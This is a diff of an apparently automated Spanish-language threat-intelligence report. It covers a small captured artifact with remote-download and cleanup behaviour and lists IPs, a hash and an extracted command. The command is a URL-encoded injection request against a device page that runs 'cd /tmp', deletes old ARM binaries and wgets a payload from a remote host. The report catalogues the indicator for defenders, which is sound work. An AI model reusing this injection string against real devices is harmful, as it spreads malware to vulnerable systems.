@@ -4,16 +4,16 @@
 
 ## 📌 Resumen
 
-Artefacto clasificado como **Payload** a partir de la evidencia disponible en Oráculo SOC. Comportamientos destacados: Descarga remota, Limpieza. Se asoció 1 comando observado o extraído.
+Artefacto de 325 B. Formato identificado como ASCII text, with CRLF line terminators. Entropía registrada: 5.11. No existe evidencia suficiente para atribuir este artefacto a una familia concreta. Comportamientos destacados: Descarga remota, Limpieza. Se identificó 1 comando observado o extraído. Se identificaron 3 indicadores técnicos.
+
 
 ## 🏷️ Clasificación
 
-- **Categoría:** `Payload`
 - **Riesgo:** `Medium`
 
 ## 🗓️ Registro
 
-- **Registrado:** `2026-08-09T19:49:11+00:00`
+- **Registrado:** `2026-08-09T19:49:11.000000Z`
 - **Tipo de registro:** `snapshot inmutable`
 
 ## 🔐 Identidad
@@ -50,10 +50,10 @@ GET /chkisg.htm%3FSip%3D1.1.1.XXX%20%7C%20cd%2B/tmp;rm%2Bmain_arm%2Bmain_arm7%2B
 
 | Tipo | Valor | Contexto |
 | --- | --- | --- |
-| ip | 190.179.168.XXX | static_analysis |
 | ip | 201.51.13.XXX | static_analysis |
-| hash | ecd9deac428f2300175f9d1d632b1da19a472b9ca932c9dfecd3327d1d618b11 | static_analysis |
+| ip | 190.179.168.XXX | static_analysis |
 | command | GET /chkisg.htm%3FSip%3D1.1.1.XXX%20%7C%20cd%2B/tmp;rm%2Bmain_arm%2Bmain_arm7%2Barm7%2Barm;wget%2Bhttp:/\/201.51.13.XXX/mai | strings |
+| hash | ecd9deac428f2300175f9d1d632b1da19a472b9ca932c9dfecd3327d1d618b11 | static_analysis |
 
 ## 🔎 Triage
 
